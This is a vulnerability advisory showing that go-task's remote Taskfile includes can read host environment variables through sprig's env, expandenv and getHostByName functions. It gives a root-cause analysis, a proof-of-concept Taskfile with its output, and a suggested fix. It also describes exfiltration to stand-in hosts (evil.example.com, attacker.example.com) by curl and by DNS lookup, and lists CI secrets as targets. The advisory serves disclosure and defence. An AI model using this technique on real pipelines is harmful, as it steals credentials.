# go-task: remote Taskfiles can read host environment variables via Sprig `env`/`expandenv`

**Package**: github.com/go-task/task
**Ecosystem**: Go
**Affected versions**: all versions with remote Taskfile includes (`TASK_X_REMOTE_TASKFILES`); tested at `3dcaa7db` (v3.51.1 nightly tip)
**Patched versions**: none
**Severity**: Medium
**CVSS 3.1**: `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` — **6.5**
**CWE**: CWE-200 (Exposure of Sensitive Information)

## Summary

go-task registers the full slim-sprig function map into its template engine,
including the OS-access functions `env`, `expandenv`, and `getHostByName`. These are
available in every template context — including Taskfiles fetched from a remote
source via the `includes:` directive. A malicious remote Taskfile can read arbitrary
host environment variables and exfiltrate them over the network.

## Root cause

`internal/templater/funcs.go:60`:

```go
templateFuncs = template.FuncMap(sprig.TxtFuncMap())
maps.Copy(templateFuncs, taskFuncs)
```

The slim-sprig map retains `env` (`os.Getenv`), `expandenv` (`os.ExpandEnv`), and
`getHostByName`. No function is removed before registration, and the same map is used
for local and remote Taskfiles alike. Helm strips exactly these functions from sprig
for this reason.

## The gap

go-task already gates remote Taskfiles behind a trust prompt
(`taskfile/reader.go`, `taskfileUntrustedPrompt`), acknowledging that remote content
is dangerous. But once the prompt is accepted — or bypassed with `--yes`, common in
CI — the remote Taskfile gets unrestricted access to the host environment through
template functions. The trust boundary covers *whether* to load remote content, not
*what capabilities* that content receives.

## Proof of concept

Verified against a from-source build (commit `3dcaa7db`).

Taskfile.yml:

```yaml
version: '3'
tasks:
  exfil:
    vars:
      STOLEN: '{{env "POC_SECRET"}}'
      EXPANDED: '{{expandenv "creds=$POC_SECRET"}}'
    cmds:
      - 'echo "env_read={{.STOLEN}}"'
      - 'echo "expandenv_read={{.EXPANDED}}"'
```

Run:

```bash
$ POC_SECRET="LEAKED-SECRET-VALUE-12345" task exfil
```

Observed output:

```
task: [exfil] echo "env_read=LEAKED-SECRET-VALUE-12345"
env_read=LEAKED-SECRET-VALUE-12345
task: [exfil] echo "expandenv_read=creds=LEAKED-SECRET-VALUE-12345"
expandenv_read=creds=LEAKED-SECRET-VALUE-12345
```

In the remote-include attack, the attacker hosts the above as
`https://evil.example.com/Taskfile.yml`; the victim includes it and the `cmds` curl
the captured values to the attacker. DNS exfiltration is also possible via
`getHostByName (printf "%s.attacker.example.com" .SECRET)`.

## Impact

A remote Taskfile included by a victim can steal any environment variable from the
host. CI/CD runners are the highest-value targets — `AWS_SECRET_ACCESS_KEY`,
`GITHUB_TOKEN`, `NPM_TOKEN`, `DOCKER_PASSWORD` are routinely present as env vars, and
`--yes` (common in pipelines) removes the only barrier. Preconditions: the
experimental remote-includes feature is enabled and the victim runs/accepts the
include.

## Suggested fix

Remove OS-access functions from the template map, at minimum for remote contexts:

```go
templateFuncs = template.FuncMap(sprig.TxtFuncMap())
delete(templateFuncs, "env")
delete(templateFuncs, "expandenv")
delete(templateFuncs, "getHostByName")
maps.Copy(templateFuncs, taskFuncs)
```

A split map (full access for local Taskfiles, restricted for remote) preserves the
local-use convenience while closing the remote path.

## Notes on scoring

Scored without scope change (`S:U`): the leaked environment belongs to the same
host/user authority that runs `task`, so there is no security-authority boundary
crossing. `C:H` reflects credential disclosure; no integrity/availability impact.
